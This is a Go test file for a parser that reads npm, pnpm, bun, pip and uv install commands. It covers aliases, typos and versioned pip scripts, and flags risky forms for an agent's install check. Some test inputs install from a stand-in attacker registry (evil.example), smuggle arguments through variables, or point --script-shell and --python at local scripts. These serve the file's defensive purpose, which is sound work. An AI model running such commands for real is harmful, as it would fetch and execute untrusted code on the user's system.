package installread

import (
	"slices"
	"testing"
)

// READER-NPM-ALIAS-1 (ADR-0159 round 12): the install forms in every name the tools accept — npm's aliases, listed
// typos and unambiguous prefixes (lib/utils/cmd-list.js of npm 9.9.4 to 12.2.2), pnpm's it, bun's a and c, uv's
// hidden `tool uvx`, pip's versioned console scripts. Placeholders zz-alias-pkg and evil.example only.

func TestReaderAliasesInstallTargets(t *testing.T) {
	for line, want := range map[string]string{
		// npm: the aliases and typos it lists, and prefixes of them
		"npm in zz-alias-pkg":              "npm:zz-alias-pkg",
		"npm ins zz-alias-pkg":             "npm:zz-alias-pkg",
		"npm inst zz-alias-pkg":            "npm:zz-alias-pkg",
		"npm insta zz-alias-pkg":           "npm:zz-alias-pkg",
		"npm instal zz-alias-pkg":          "npm:zz-alias-pkg",
		"npm isnt zz-alias-pkg":            "npm:zz-alias-pkg",
		"npm isnta zz-alias-pkg":           "npm:zz-alias-pkg",
		"npm isntal zz-alias-pkg":          "npm:zz-alias-pkg",
		"npm isntall zz-alias-pkg":         "npm:zz-alias-pkg",
		"npm ad zz-alias-pkg":              "npm:zz-alias-pkg", // npm 12 dropped adduser: ad is add's prefix
		"npm it zz-alias-pkg":              "npm:zz-alias-pkg", // install-test: npm install, then npm test
		"npm install-test zz-alias-pkg":    "npm:zz-alias-pkg",
		"npm install-t zz-alias-pkg":       "npm:zz-alias-pkg",
		"npm installTest zz-alias-pkg":     "npm:zz-alias-pkg", // deref reads camelCase as its dashed spelling
		"npm -D isntall zz-alias-pkg":      "npm:zz-alias-pkg",
		"npm --prefix app in zz-alias-pkg": "npm:zz-alias-pkg",
		"npm exe zz-alias-pkg":             "npm:zz-alias-pkg", // exec
		"npm cr zz-alias-pkg":              "npm:create-zz-alias-pkg",
		"npm ini zz-alias-pkg":             "npm:create-zz-alias-pkg",
		// pnpm's install-test, bun's add and create
		"pnpm it zz-alias-pkg":  "npm:zz-alias-pkg",
		"bun a zz-alias-pkg":    "npm:zz-alias-pkg",
		"bun a -d zz-alias-pkg": "npm:zz-alias-pkg",
		"bun c zz-alias-pkg":    "npm:create-zz-alias-pkg",
		// pip's versioned scripts, by path and on Windows
		"pip3.12 install zz-alias-pkg":                          "pypi:zz-alias-pkg",
		"pip3.9 install -U zz-alias-pkg":                        "pypi:zz-alias-pkg",
		"pip2 install zz-alias-pkg":                             "pypi:zz-alias-pkg",
		"pip2.7 install zz-alias-pkg":                           "pypi:zz-alias-pkg",
		"/usr/local/bin/pip3.13 install zz-alias-pkg":           "pypi:zz-alias-pkg",
		`C:\Python312\Scripts\pip3.12.exe install zz-alias-pkg`: "pypi:zz-alias-pkg",
		"sudo pip3.11 install zz-alias-pkg":                     "pypi:zz-alias-pkg",
		"pipx runpip venv install zz-alias-pkg":                 "pypi:zz-alias-pkg", // control: pip's words through pipx
		// uv's hidden alias of tool run
		"uv tool uvx zz-alias-pkg":               "pypi:zz-alias-pkg",
		"uv tool uvx --from zz-alias-pkg zz-bin": "pypi:zz-alias-pkg",
	} {
		tg, un, _, _ := ParseLine(line)
		if !slices.Equal(tg, []string{want}) || len(un) > 0 {
			t.Errorf("%q: targets %v, unread %q; want [%s] and no reason", line, tg, un, want)
		}
	}
}

// The lockfile forms are install forms with nothing named (as npm ci), and a word npm reads as another command stays
// what it was: no target, no reason.
func TestReaderAliasesOtherForms(t *testing.T) {
	for _, line := range []string{
		"npm cit", "npm sit", "npm install-ci-test", "npm isntall-clean", "npm ic", "npm it", "bun c", "pnpm it",
		"npm run in", "npm t", "npm tst", "npm s zz-alias-pkg", "npm se zz-alias-pkg", "npm info zz-alias-pkg",
		"npm un zz-alias-pkg", "npm r zz-alias-pkg", "bun r zz-alias-pkg", "bun rm zz-alias-pkg", "pip3.12 list",
		"pip3.12 show zz-alias-pkg", "uv tool list", "yarn a zz-alias-pkg",
	} {
		if tg, un, _, _ := ParseLine(line); len(tg) > 0 || len(un) > 0 {
			t.Errorf("%q: targets %v, unread %q; want neither", line, tg, un)
		}
	}
	// the lockfile forms are install forms, as npm ci is: nothing else runs (install_check reads no mixed line)
	for _, line := range []string{"npm ci", "npm cit", "npm sit", "npm install-ci-test", "npm isntall-clean", "npm it"} {
		if _, _, other, _ := ParseLine(line); other || OtherProgram(line) != "" {
			t.Errorf("%q: other %v, OtherProgram %q", line, other, OtherProgram(line))
		}
	}
}

// The forms' other readings follow the alias: a registry, a hidden word before the subcommand, the second reader's
// levers, an install whose words come from xargs.
func TestReaderAliasesReasons(t *testing.T) {
	for line, code := range map[string]string{
		"npm isntall zz-alias-pkg --registry=https://evil.example/":              "custom_registry",
		"npm $P in zz-alias-pkg":                                                 "variable_argument",
		"bun $P a zz-alias-pkg":                                                  "variable_argument",
		"uv $P tool uvx zz-alias-pkg":                                            "variable_argument",
		"pip3.12 install -i https://evil.example/simple zz-alias-pkg":            "custom_registry",
		"PIP_INDEX_URL=https://evil.example/simple pip3.12 install zz-alias-pkg": "custom_registry",
		"pip3.12 $P install zz-alias-pkg":                                        "variable_argument",
		"uv tool uvx --index https://evil.example/simple zz-alias-pkg":           "custom_registry",
	} {
		if _, codes := codesOn(line); !slices.Contains(codes, code) {
			t.Errorf("%q: codes %v, want %s", line, codes, code)
		}
	}
	// the second reader reads npm's own options after an alias as after install (ownOptionsEnd)
	for _, line := range []string{
		"npm in zz-alias-pkg --script-shell=./zz.sh",
		"npm it zz-alias-pkg --script-shell ./zz.sh",
		"bun a zz-alias-pkg --config=./zz.toml",
		"pip3.12 install zz-alias-pkg --python ./zz-python",
	} {
		tg, un, _, s := ParseLine(line)
		if len(HookExtra(line, tg, un, s)) == 0 {
			t.Errorf("%q: the second reader gave no reason", line)
		}
	}
	if _, un, _, _ := ParseLine("cat list | xargs npm isntall"); len(un) == 0 {
		t.Error("xargs npm isntall: no reason")
	}
	if _, un, _, _ := ParseLine("cat list | xargs pip3.12 install"); len(un) == 0 {
		t.Error("xargs pip3.12 install: no reason")
	}
}

// Commands gives the program and words in the reader's names (alalanet-agent judges a line on them), and ProgramName
// the program install_check looks a launch line up by.
func TestReaderAliasesCommandsAndProgramName(t *testing.T) {
	cs := Commands("pip3.12 install zz-alias-pkg && uv tool uvx zz-alias-pkg && npm isntall zz-alias-pkg")
	if len(cs) != 3 || cs[0].Prog != "pip" || cs[1].Prog != "uv" || !slices.Equal(cs[1].Words, []string{"uv", "tool", "run", "zz-alias-pkg"}) ||
		!slices.Equal(cs[2].Words, []string{"npm", "install", "zz-alias-pkg"}) {
		t.Errorf("Commands: %+v", cs)
	}
	for w, want := range map[string]string{"/usr/bin/pip3.12": "pip", "PIP3.EXE": "pip3", "pip": "pip", "pip3.12.cmd": "pip",
		"pipx": "pipx", "pip-3.12": "pip-3.12", "pip3.12.1": "pip3.12.1", "pip3a": "pip3a", "npm": "npm", "pip.12": "pip.12"} {
		if got := ProgramName(w); got != want {
			t.Errorf("ProgramName(%q) = %q, want %q", w, got, want)
		}
	}
}

// npmCommand reads a word as npm's deref does; pmVerb keeps the words the reader's forms name already.
func TestReaderAliasesNpmCommand(t *testing.T) {
	for w, want := range map[string]string{"isntall": "install", "installTest": "install-test", "installCiTest": "install-ci-test",
		"cleanInstall": "ci", "exe": "exec", "creat": "init", "conf": "config", "Install": "", "iNstall": "", "ex": "", "": "",
		"install-": "", "sit": "install-ci-test", "x": "exec"} {
		if got := npmCommand(w); got != want {
			t.Errorf("npmCommand(%q) = %q, want %q", w, got, want)
		}
	}
	for _, c := range [][3]string{{"npm", "add", "add"}, {"npm", "create", "create"}, {"npm", "clean-install", "clean-install"},
		{"npm", "c", "c"}, {"npm", "conf", "config"}, {"npm", "isntall-clean", "ci"}, {"npm", "it", "install"}, {"npm", "run", "run"},
		{"pnpm", "install-test", "install"}, {"pnpm", "in", "in"}, {"bun", "c", "create"}, {"yarn", "a", "a"}, {"npm", "Install", "Install"}} {
		if got := pmVerb(c[0], c[1]); got != c[2] {
			t.Errorf("pmVerb(%q, %q) = %q, want %q", c[0], c[1], got, c[2])
		}
	}
	// a copy when a word changes: the line's own words stay as written
	rest := []string{"isntall", "zz-alias-pkg"}
	if _, got := canonCommand("npm", rest); got[0] != "install" || rest[0] != "isntall" {
		t.Errorf("canonCommand: %v, the line's words %v", got, rest)
	}
}
